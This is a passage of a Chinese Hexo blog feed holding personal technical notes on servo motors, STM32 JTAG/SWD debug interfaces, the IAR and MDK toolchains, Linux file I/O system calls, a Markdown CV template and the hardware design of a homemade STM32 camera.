mechanism）是使物体的位置、方位、状态等输出被控量能够跟随输入目标（或给定值）的任意变化的自动控制系统。伺服主要靠脉冲来定位，基本上可以这样理解，伺服电机接收到1个脉冲，就会旋转1个脉冲对应的角度，从而实现位移，因为，伺服电机本身具备发出脉冲的功能，所以伺服电机每旋转一个角度，都会发出对应数量的脉冲，这样，和伺服电机接受的脉冲形成了呼应，或者叫闭环，如此一来，系统就会知道发了多少脉冲给伺服电机，同时又收了多少脉冲回来，这样，就能够很精确的控制电机的转动，从而实现精确的定位，可以达到0.001mm。直流伺服电机分为有刷和无刷电机。有刷电机成本低，结构简单，启动转矩大，调速范围宽，控制容易，需要维护，但维护不方便（换碳刷），产生电磁干扰，对环境有要求。因此它可以用于对成本敏感的普通工业和民用场合。<br>无刷电机体积小，重量轻，出力大，响应快，速度高，惯量小，转动平滑，力矩稳定。控制复杂，容易实现智能化，其电子换相方式灵活，可以方波换相或正弦波换相。电机免维护，效率很高，运行温度低，电磁辐射很小，长寿命，可用于各种环境。</p></li><li><p>交流伺服电机也是无刷电机，分为同步和异步电机，运动控制中一般都用同步电机，它的功率范围大，可以做到很大的功率。大惯量，最高转动速度低，且随着功率增大而快速降低。因而适合做低速平稳运行的应用。</p></li><li><p>伺服电机内部的转子是永磁铁，驱动器控制的U&#x2F;V&#x2F;W三相电形成电磁场，转子在此磁场的作用下转动，同时电机自带的编码器反馈信号给驱动器，驱动器根据反馈值与目标值进行比较，调整转子转动的角度。伺服电机的精度决定于编码器的精度（线数）。</p></li></ol><p>交流伺服电机和无刷直流伺服电机在功能上的区别：交流伺服要好一些，因为是正弦波控制，转矩脉动小。直流伺服是梯形波。但直流伺服比较简单，便宜。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402060313689.png"> 工业用伺服电机</p><h2 id="伺服电机的特点对比"><a href="#伺服电机的特点对比" class="headerlink" title="伺服电机的特点对比"></a>伺服电机的特点对比</h2><p>直流无刷伺服电机特点 转动惯量小、启动电压低、空载电流小； 弃接触式换向系统，大大提高电机转速，最高转速高达100 000rpm；无刷伺服电机在执行伺服控制时，无须编码器也可实现速度、位置、扭矩等的控制； 不存在电刷磨损情况，除转速高之外，还具有寿命长、噪音低、无电磁干扰等特点。 直流有刷伺服电机特点</p><ol><li>体积小、动作快反应快、过载能力大、调速范围宽</li><li>低速力矩大, 波动小，运行平稳</li><li>低噪音,高效率</li><li>后端编码器反馈（选配）构成直流伺服等优点</li><li>变压范围大，频率可调</li></ol><h2 id="伺服电机对于普通电机的优点"><a href="#伺服电机对于普通电机的优点" class="headerlink" title="伺服电机对于普通电机的优点"></a>伺服电机对于普通电机的优点</h2><ol><li>精度：实现了位置，速度和力矩的闭环控制；克服了步进电机失步的问题；</li><li>转速：高速性能好，一般额定转速能达到2000～3000转；</li><li>适应性：抗过载能力强，能承受三倍于额定转矩的负载，对有瞬间负载波动和要求快速起动的场合特别适用；</li><li>稳定：低速运行平稳，低速运行时不会产生类似于步进电机的步进运行现象。适用于有高速响应要求的场合；</li><li>及时性：电机加减速的动态相应时间短，一般在几十毫秒之内；</li><li>舒适性：发热和噪音明显降低。<br>简单点说就是：平常看到的那种普通的电机，断电后它还会因为自身的惯性再转一会儿，然后停下。而伺服电机和步进电机是说停就停，说走就走，反应极快。但步进电机存在失步现象。</li></ol><h2 id="伺服电机的应用场景"><a href="#伺服电机的应用场景" class="headerlink" title="伺服电机的应用场景"></a>伺服电机的应用场景</h2><p>伺服电机的应用领域就太多了。只要是要有动力源的，而且对精度有要求的一般都可能涉及到伺服电机。如机床、印刷设备、包装设备、纺织设备、激光加工设备、机器人、自动化生产线等对工艺精度、加工效率和工作可靠性等要求相对较高的设备。</p>]]></content>
    
    
    <categories>
      
      <category>电机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电机及其驱动</title>
    <link href="/2024/02/29/%E7%94%B5%E6%9C%BA%E5%8F%8A%E5%85%B6%E9%A9%B1%E5%8A%A8/"/>
    <url>/2024/02/29/%E7%94%B5%E6%9C%BA%E5%8F%8A%E5%85%B6%E9%A9%B1%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<p>记录电机的相关知识点</p><span id="more"></span><h1 id="电机的基本概念"><a href="#电机的基本概念" class="headerlink" title="电机的基本概念"></a>电机的基本概念</h1><p>定子、转子、电刷。</p>]]></content>
    
    
    <categories>
      
      <category>电机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32中常用的调试接口</title>
    <link href="/2024/02/28/stm32%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3/"/>
    <url>/2024/02/28/stm32%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<p>记录stm32中常用的调试接口</p><span id="more"></span><h1 id="最长见的两个——JTAG-SWD"><a href="#最长见的两个——JTAG-SWD" class="headerlink" title="最长见的两个——JTAG&amp;SWD"></a>最长见的两个——JTAG&amp;SWD</h1><h2 id="JTAG"><a href="#JTAG" class="headerlink" title="JTAG"></a>JTAG</h2><p>JTAG（Joint Test Action Group，联合测试行动小组）是一种国际标准测试协议（IEEE 1149.1兼容），主要用于芯片内部测试。现在多数的高级器件都支持JTAG协议，如ARM、DSP、FPGA器件等。标准的JTAG接口是4线：TMS、 TCK、TDI、TDO，分别为模式选择、时钟、数据输入和数据输出线。 相关JTAG引脚的定义为：</p><ul><li>TMS：测试模式选择，TMS用来设置JTAG接口处于某种特定的测试模式；</li><li>TCK：测试时钟输入；</li><li>TDI：测试数据输入，数据通过TDI引脚输入JTAG接口；</li><li>TDO：测试数据输出，数据通过TDO引 脚从JTAG接口输出；</li></ul><p><code>JTAG</code>接口的连接图如下；<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404150244008.png"></p><ul><li>TDI（Test Data In）：串行输入引脚</li><li>TDO（Test Data Out）：串行输出引脚</li><li>TCK（Test Clock）：时钟引脚，一般附加 100k 下拉电阻</li><li>TMS（Test Mode Select）：模式选择（控制信号）引脚</li><li>TRST（Test Reset）：复位引脚</li></ul><p>JTAG 的优势：</p><ul><li>不限于 ARM 系列芯片</li><li>具有更多用于编程，调试和生产测试的用途</li></ul><h2 id="SWD"><a href="#SWD" class="headerlink" title="SWD"></a>SWD</h2><p>串行调试（Serial Wire Debug），应该可以算是一种和JTAG不同的调试模式，使用的调试协议也应该不一样，所以最直接的体现在调试接口上，与JTAG的20个引脚相比，SWD只需要4个（或者5个）引脚，结构简单，但是使用范围没有JTAG广泛，主流调试器上也是后来才加的SWD调试模式。</p><p><strong>该调试接口是 ARM 专门设计的协议，仅支持 ARM（所以在 ARM 系列单片机中性能表现较佳）。</strong></p><p>SWD接口的优势：</p><ul><li>在大家GPIO刚好缺一个的时候，可以使用SWD仿真，这种模式支持更少的引脚。<br>在大家板子的体积有限的时候推荐使用SWD模式，它需要的引脚少，当然需要的PCB空间就小啦！比如你可以选择一个很小的2.54间距的5芯端子做仿真接口。</li><li>SWD模式比JTAG在高速模式下面更加可靠。在大数据量的情况下面JTAG下载程序会失败，但是SWD发生的几率会小很多。基本使用JTAG仿真模式的情况下是可以直接使用SWD模式的，只要你的仿真器支持，所以推荐大家使用这个模式。</li></ul><p>SWD 一般使用 2 个引脚：</p><ul><li>SWDIO（Serial Wire Data Input Output）：串行数据输入输出引脚</li><li>SWCLK（Serial Wire Clock）：串行线时钟引脚</li></ul><p>SWD 的优势：</p><ul><li>使用引脚更少，只需 SWDIO 和 SWCLK 两个引脚</li><li>SWD 具有特殊功能，例如打印调试信息</li><li>与 JTAG 相比，SWD 在速度上具有更好的整体性能</li></ul><h2 id="二者的异同"><a href="#二者的异同" class="headerlink" title="二者的异同"></a>二者的异同</h2><p>选用 SWD 而非 JTAG 的理由：</p><ul><li>电路原理图设计需要足够简单，且可以在没有 JTAG 功能的情况下进行测试</li><li>PCB 在尺寸方面有限制，SWD 可以节省空间</li><li>MCU 已经没有多余的引脚给 JTAG 用了</li></ul><p><strong>JTAG使用的是<code>J-Link</code>是德国SEGGER公司推出基于JTAG的仿真器。</strong>简单地说，是给一个JTAG协议转换盒，即一个小型USB到JTAG的转换盒，其连接到计算机用的是USB接口，而到目标板内部用的还是JTAG协议。它完成了一个从软件到硬件转换的工作。</p><p>JLINK是一个通用的开发工具，可以用于KEIL、IAR、ADS 等平台。速度，效率，功能都很好，据说是众多仿真器里最强悍的。</p><p><strong>ULINK是ARM&#x2F;KEIL公司推出的仿真器，目前网上可找到的是其升级版本，ULINK2和ULINK Pro仿真器。</strong>ULINK&#x2F;ULINK2可以配合Keil软件实现仿真功能，并且仅可以在Keil软件上使用，增加了串行调试（SWD）支持，返回时钟支持和实时代理等功能。开发工程师通过结合使用RealView MDK的调试器和ULINK2，可以方便的在目标硬件上进行片上调试（使用on-chip JTAG，SWD和OCDS）、Flash编程。</p><p><strong>但是要注意的是，ULINK是KEIL公司开发的仿真器，专用于KEIL平台下使用，ADS、IAR下不能使用。</strong></p><h3 id="共同之处"><a href="#共同之处" class="headerlink" title="共同之处"></a>共同之处</h3><ul><li>供电电压范围: 1.2 V - 5.5 V</li><li>时钟速率: 可配置高达 10 MHz</li><li>SWO 跟踪捕获: 数据速率高达 50 Mbit&#x2F;s（UART&#x2F;NRZ 模式）</li><li>隔离电压: 1 kV</li><li>热插拔：支持</li></ul><h3 id="STLINK-V2调试器"><a href="#STLINK-V2调试器" class="headerlink" title="STLINK V2调试器"></a>STLINK V2调试器</h3><p>这个调试器是st官方制作用来调试<code>stm</code>单片机的调试器。</p><p>主要提供了一个用于 STM32 的JTAG与SWD&#x2F;SWV连接器和一个用于 STM8 的SWIM连接器两种连接方式。</p><h2 id="JTAG-与-SWD-的兼容性"><a href="#JTAG-与-SWD-的兼容性" class="headerlink" title="JTAG 与 SWD 的兼容性"></a>JTAG 与 SWD 的兼容性</h2><p>一般来说，单片机板子上会有以下这些烧录座，可同时兼容 JTAG 与 SWD：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404150252068.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404150253529.png"></p><ul><li>TCK 兼容 SWCLK</li><li>TMS 兼容 SWDIO</li><li>TDO 兼容 SWO）</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p><a href="https://blog.csdn.net/LEON1741/article/details/72846434">https://blog.csdn.net/LEON1741/article/details/72846434</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/75312614">https://zhuanlan.zhihu.com/p/75312614</a></p></li><li><p><a href="https://wiki-power.com/SWD%E4%B8%8EJTAG%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/#jtag-swd">https://wiki-power.com/SWD%E4%B8%8EJTAG%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/#jtag-swd</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自制电子相机(3)-软件设计</title>
    <link href="/2024/02/28/%E8%87%AA%E5%88%B6%E7%94%B5%E5%AD%90%E7%9B%B8%E6%9C%BA-3-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1/"/>
    <url>/2024/02/28/%E8%87%AA%E5%88%B6%E7%94%B5%E5%AD%90%E7%9B%B8%E6%9C%BA-3-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>记录该项目的软件设计过程</p><span id="more"></span><h1 id="使用的库"><a href="#使用的库" class="headerlink" title="使用的库"></a>使用的库</h1><p>根据前面所分析的需求，我使用了一下软件库：</p><ul><li>FreeRTOS：实时操作系统，用以更好的管理程序</li><li>FatFS：文件系统，用以更好的管理图片、视频</li><li>LibJPEG：JPEG转换库，用以将其他图片文件格式转换为JPEG，方便和上位机的交互</li><li>st系统编程库：用以控制stm32芯片及其外设电路</li></ul><h1 id="不同模式所不同的软硬件"><a href="#不同模式所不同的软硬件" class="headerlink" title="不同模式所不同的软硬件"></a>不同模式所不同的软硬件</h1>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IAR和MDK</title>
    <link href="/2024/02/27/IAR%E5%92%8CMDK/"/>
    <url>/2024/02/27/IAR%E5%92%8CMDK/</url>
    
    <content type="html"><![CDATA[<p>记载IAR和MDK这两个单片机开发使用较多的IDE</p><span id="more"></span><h1 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h1><p>这里两个都是一套工具链。实际上是<code>IAR</code>开发时间要早于<code>MDK</code>。但是由于近年来<code>ARM</code>公司收购了<code>MDK</code>所以对于现在来说<code>MDK</code>的使用率应该要高于<code>IAR</code>的。</p><p>实际上，<code>MDK</code>也可以称之为<code>Keil</code>。这两者之间的关系是，前者是一套工具链，后者是使用这个工具链的<code>IDE</code>。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.eefocus.com/article/479766.html">https://www.eefocus.com/article/479766.html</a></li><li><a href="https://www.armbbs.cn/forum.php?mod=viewthread&tid=93102&fromuid=58">https://www.armbbs.cn/forum.php?mod=viewthread&amp;tid=93102&amp;fromuid=58</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>系统编程-文件系统IO</title>
    <link href="/2024/02/27/%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9FIO/"/>
    <url>/2024/02/27/%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9FIO/</url>
    
    <content type="html"><![CDATA[<p>注意这是我的《Linux-Unix系统编程手册》这个本书的第四章和第五章的笔记</p><span id="more"></span><h1 id="通过的文件IO接口"><a href="#通过的文件IO接口" class="headerlink" title="通过的文件IO接口"></a>通过的文件IO接口</h1><p>在Linux中的文件结构都是通用的，<strong>这意味这使用几个函数就可以控制系统中的所有文件类型，包括终端</strong>。</p><p>这些通用接口主要是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">open();<br>write();<br>read();<br>lseek();<br>close();<br>creat();<span class="hljs-comment">//由于可以使用open()来打开、创建一个文件，所以这个函数用的少。</span><br></code></pre></td></tr></table></figure><p>还包括一个通用接口以外的函数：<code>ioctl()</code>，ioctl()系统调用又为执行文件和设备操作提供了一种多用途机制。</p><h2 id="open-函数"><a href="#open-函数" class="headerlink" title="open()函数"></a>open()函数</h2><p>这个函数就是打开一个文件，返回所打开文件的文件描述符。可以使用各种标志位来打开文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">open()<span class="hljs-comment">//第一个参数是文件位置，第二个是如何打开文件，第三个是权限。</span><br><br><span class="hljs-type">int</span> dst_fd = open(destination, O_CREAT | O_WRONLY | O_TRUNC, <span class="hljs-number">0644</span>);<br></code></pre></td></tr></table></figure><h2 id="read-函数"><a href="#read-函数" class="headerlink" title="read()函数"></a>read()函数</h2><p>从指定的文件中读取数据到<code>buffer</code>中，返回所读取的字符个数。</p><p>如果 <code>read()</code>调用成功，将返回实际读取的字节数，如果遇到文件结束（EOF）则返回 <code>0</code>，<br>如果出现错误则返回<code>-1</code>。<code>ssize_t</code> 数据类型属于有符号的整数类型，用来存放（读取的）字节数或<code>-1</code>（表示错误）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">read()<span class="hljs-comment">//第一个参数是从哪个文件中读取，第二个是存到哪里去，第三个是一个读取字符的数量。</span><br><br><span class="hljs-keyword">while</span>((readed = read(STDIN_FILENO, buf, BUF_SIZE)) &gt; <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>一次 read()调用所读取的字节数可以小于请求的字节数。对于普通文件而言，这有可能是因为当前读取位置靠近文件尾部。当 read()应用于其他文件类型时，比如管道、FIFO、socket 或者终端，在不同环境下也会出现 read()调用读取的字节数小于请求字节数的情况。例如，默认情况下从终端读取字符，一遇到换行符（\n），read()调用就会结束。</p><h2 id="write-函数"><a href="#write-函数" class="headerlink" title="write()函数"></a>write()函数</h2><p>这个函数参数含义和<code>read()</code>函数意义一致。返回的是读取到的字符个数，<strong>注意如果 write()调用成功，将返回实际写入文件的字节数，该返回值可能小于 count 参数值。这被称为“部分写”。对磁盘文件来说，造成“部分写”的原因可能是由于磁盘已满，或是因为进程资源对文件大小的限制。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>((w = write(fd, buf + wrote, readed - wrote)) ==<span class="hljs-number">-1</span>)<br></code></pre></td></tr></table></figure><h2 id="close-函数"><a href="#close-函数" class="headerlink" title="close()函数"></a>close()函数</h2><p>关闭文件，成功返回<code>0</code>，反之<code>-1</code>。</p><h2 id="lseek-函数"><a href="#lseek-函数" class="headerlink" title="lseek()函数"></a>lseek()函数</h2><p>改变、获取文件的偏移量。返回现在文件偏移量位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">lseek()<span class="hljs-comment">//第一个参数指定文件，第三个参数是指定位置，第二个参数是指定偏移量</span><br><span class="hljs-type">off_t</span> src_size = lseek(src_fd, <span class="hljs-number">0</span>, SEEK_END);<br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141816452.png"></p><p>lseek()并不适用于所有类型的文件。不允许将 lseek()应用于管道、FIFO、socket 或者终端。一旦如此，调用将会失败，并将 errno 置为 ESPIPE。另一方面，只要合情合理，也可以将 lseek()应用于设备。例如，在磁盘或者磁带上查找一处具体位置</p><h1 id="文件空洞"><a href="#文件空洞" class="headerlink" title="文件空洞"></a>文件空洞</h1><p>如果程序的文件偏移量已然跨越了文件结尾，然后再执行 I&#x2F;O 操作，将会发生什么情况？read()调用将返回 0，表示文件结尾。有点令人惊讶的是，write()函数可以在文件结尾后的任意位置写入数据。</p><p>在没有向其中写入数据的时候，文件空洞是不占内存的。但是一旦向其中写入一些数据，则操作系统会为这些数据分配存储空间。<strong>但是文件的大小并不会变</strong>。</p><p><strong>所谓的文件空洞就是会占用名义存储空间，但是不会占用实际存储空间。</strong>但是对于不支持的文件空洞的文件系统来说，就会直接将数据直接存储到存储空间里。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>《Linux-Unix系统编程手册》</li></ul>]]></content>
    
    
    <categories>
      
      <category>系统编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何使用Markdown写一份简历</title>
    <link href="/2024/02/26/%E5%A6%82%E4%BD%95%E7%94%A8Markdown%E5%86%99%E4%B8%80%E4%BB%BD%E7%AE%80%E5%8E%86/"/>
    <url>/2024/02/26/%E5%A6%82%E4%BD%95%E7%94%A8Markdown%E5%86%99%E4%B8%80%E4%BB%BD%E7%AE%80%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<p>如何使用Markdown写一份简历</p><span id="more"></span><h1 id="如何用-Markdown-写一份简历"><a href="#如何用-Markdown-写一份简历" class="headerlink" title="如何用 Markdown 写一份简历"></a>如何用 Markdown 写一份简历</h1><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210318220041.png"></p><p>用 Markdown 写一份可在线预览，也可导出 PDF 的简历。</p><p><strong>预览网址</strong>：<a href="https://cv-template.wiki-power.com/"><strong>cv-template.wiki-power.com</strong></a></p><p><strong>如何导出 PDF</strong>：在网页上使用快捷键 <code>Ctrl</code> + <code>P</code> 唤出打印界面，目标打印机选择 <code>Microsoft Print to PDF</code>，即可导出 PDF 版本的简历。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>打开项目 <a href="https://github.com/linyuxuanlin/Markdown-CV-Site"><strong>linyuxuanlin&#x2F;Markdown-CV-Site</strong></a>，点击绿色的按钮 <code>Use this template</code> 初始化为自己的仓库。</p><p>打开 <a href="https://vercel.com/"><strong>Vercel</strong></a>，点击 <code>New Project</code>，导入刚刚初始化的 GitHub 仓库，设置下列参数：</p><ul><li><code>FRAMEWORK PRESET</code>：选择 <code>Other</code></li><li><code>BUILD COMMAND</code>：填入 <code>npm run build</code></li><li><code>OUTPUT DIRECTORY</code>：填入 <code>dist</code></li></ul><p>点击下一步，等待几十秒，网站就生成了。</p><p>如需修改简历的内容，请编辑根目录下的 <code>_config.yml</code> 和 <code>markdown/resume-template.md</code> 文件，推送到 GitHub 仓库后，可自动触发 Vercel 构建。</p><h2 id="参考与致谢"><a href="#参考与致谢" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><p>本项目基于 <a href="https://github.com/BigLiao/markCV"><strong>BigLiao&#x2F;markCV</strong></a>，做了一些 UI 的简化和改善。简历模板使用的是 <a href="https://cv.ftqq.com/"><strong>冷熊简历</strong></a> 的默认内容。</p><ul><li><a href="https://mp.weixin.qq.com/s/P64bm-SBYXyQymfHAR1rqA">聊聊简历怎么写？</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自制电子相机（2）- 硬件设计</title>
    <link href="/2024/02/25/%E8%87%AA%E5%88%B6%E7%94%B5%E5%AD%90%E7%9B%B8%E6%9C%BA%EF%BC%882%EF%BC%89-%20%E7%A1%AC%E4%BB%B6%E8%AE%BE%E8%AE%A1/"/>
    <url>/2024/02/25/%E8%87%AA%E5%88%B6%E7%94%B5%E5%AD%90%E7%9B%B8%E6%9C%BA%EF%BC%882%EF%BC%89-%20%E7%A1%AC%E4%BB%B6%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>记录该项目的硬件设计过程</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我发现，对于stm32的硬件设计其实只需要确定好有哪些外设，这些外设需要使用哪些片上外设。然后根据这个就可以按照stm32的<strong>数据手册中的引脚图来进行选择配置了</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402250120951.png"></p><p>上图是stm32的数据手册的引脚图的图注。</p><p>根据确定好的硬件就可以开始原理图的绘制，然后布置好PCB发至工厂进行制作即可。</p><p>所以我们进行硬件设计的重要的是<strong>明确需求，根据需求来选择合适的硬件进行设计</strong></p><h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>由于我想制作一个电子摄像机，主要功能就是可以进行拍摄照片、录制视频；然后可以在显示器中显示，并且自带一个锂电池方便出行。</p><p>根据上面分析的需求，我需要一下模块：</p><ul><li>主芯片</li><li>镜头模块</li><li>电池模块</li><li>显示器模块</li><li>JTAG调试接口</li><li>其他芯片必须外部电路</li></ul><p>其中提供三种模式：</p><ul><li>实时模式</li><li>视频模式</li><li>拍照模式</li></ul><p>以上三种模式要有不同的硬、软件要求。</p><h1 id="系统设计"><a href="#系统设计" class="headerlink" title="系统设计"></a>系统设计</h1><p>这一步主要是进行系统的设计，提出一个系统的设计方案。由于我需要制作一个相机，所以一定<strong>不可以是一块PCB板就可以的，我的打算是做三块PCB板</strong>：</p><ul><li>中间层：芯片核心板以及主要的外设电路</li><li>上层：显示板以及按钮电路</li><li>下层：镜头板</li></ul><p>各个PCB之间使用连接器或者是排插来连接。</p><p>3张<code>PCB</code>板中放置的电路以及<code>PCB</code>之间的联系：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281729087.png"></p><h2 id="摄像模块的设计"><a href="#摄像模块的设计" class="headerlink" title="摄像模块的设计"></a>摄像模块的设计</h2><h3 id="实时模式"><a href="#实时模式" class="headerlink" title="实时模式"></a>实时模式</h3><p>在这个模式下，摄像头所拍摄到的数据直接显示到显示器上。所以其对于实行性有着更高的要求。</p><p>所以可以<strong>有摄像头读取到数据之后直接通过<code>DMA</code>将数据从<code>DCMA</code>直接传输到<code>FSMC</code>再到显示器中。</strong>以此来提高速度。</p><h3 id="拍照模式"><a href="#拍照模式" class="headerlink" title="拍照模式"></a>拍照模式</h3><p>将拍下的数据直接存进<code>sd</code>中，之后去查看的时候就可以直接从<code>sd</code>卡中读取数据。</p><h3 id="视频模式"><a href="#视频模式" class="headerlink" title="视频模式"></a>视频模式</h3><h1 id="外设选型"><a href="#外设选型" class="headerlink" title="外设选型"></a>外设选型</h1><h2 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h2><p>我选用的是微雪的<code>ov5640</code>模组，主要的参数如下：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141545529.png"></p><p>TODO<br><strong>更多的信息可以参考<a href="">这篇文章</a></strong></p><h3 id="引脚定义"><a href="#引脚定义" class="headerlink" title="引脚定义"></a>引脚定义</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141547740.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404122004176.png"></p><p>以上的数据都是在微雪的<code>0v7670</code>模组的数据手册中获取的。</p><h3 id="原理图"><a href="#原理图" class="headerlink" title="原理图"></a>原理图</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404122004952.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404122005381.png"></p><table><thead><tr><th>模块引脚</th><th>STM32引脚</th></tr></thead><tbody><tr><td>DCMI_SCL</td><td>PD6</td></tr><tr><td>DCMI_SDA</td><td>PD7</td></tr><tr><td>DCMI_D0</td><td>PC6</td></tr><tr><td>DCMI_D1</td><td>PC7</td></tr><tr><td>DCMI_D2&#x2F;SDIO_D0</td><td>PC8</td></tr><tr><td>DCMI_D3</td><td>PC9</td></tr><tr><td>DCMI_D4</td><td>PE4</td></tr><tr><td>DCMI_D5</td><td>PE5</td></tr><tr><td>DCMI_D6</td><td>PB8</td></tr><tr><td>DCMI_D7</td><td>PE6</td></tr><tr><td>DCMI_HREF</td><td>PA4</td></tr><tr><td>DCMI_VSYNC</td><td>PB7</td></tr><tr><td>DCMI_PCLK</td><td>PA6</td></tr><tr><td>DCMI_XCLK</td><td>PA8</td></tr><tr><td>DCMI_RESET</td><td>PC1</td></tr><tr><td>DCMI_PWDN</td><td>PC0</td></tr></tbody></table><p>下面这个是在主控芯片为<code>stm32f75xx</code>时绘制的。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404122018250.png"></p><p><strong>实际上，大部分的摄像机模块的引脚都是相同的。所以可以连起来使用的</strong></p><h2 id="按钮-旋钮电路"><a href="#按钮-旋钮电路" class="headerlink" title="按钮&amp;旋钮电路"></a>按钮&amp;旋钮电路</h2><p>这里主要是两个按钮，当作快门和模式选择键。那一个旋钮键是用来切换图片的，其主要作用是用在软件的切换图片当中。</p><h3 id="电路图绘制"><a href="#电路图绘制" class="headerlink" title="电路图绘制"></a>电路图绘制</h3><p>旋钮：</p><p>这是第一种方法：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403202144819.png"></p><p>第二种方法：<a href="https://oshwhub.com/lightandelectricity/keyboard16">来源</a></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403202145277.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403202145549.png"></p><p>按钮：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403202213834.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403202214957.png"></p><h2 id="FLASH存储"><a href="#FLASH存储" class="headerlink" title="FLASH存储"></a>FLASH存储</h2><p><code>flash</code>存储在单片机中担任外存的角色。由于预算有效，我使用的是华邦的<code>W25Q256JVEIQ</code> NOR FLASH。单片价格是14左右，相比于瑞萨等等公司动则3、40的nor flash芯片还是便宜不少的。</p><p>关于这个芯片的数据手册可以去其官网，或者是嘉立创上下载。</p><p><strong>其与单片机之间的通信主要是通过SPI</strong></p><h3 id="引脚定义-1"><a href="#引脚定义-1" class="headerlink" 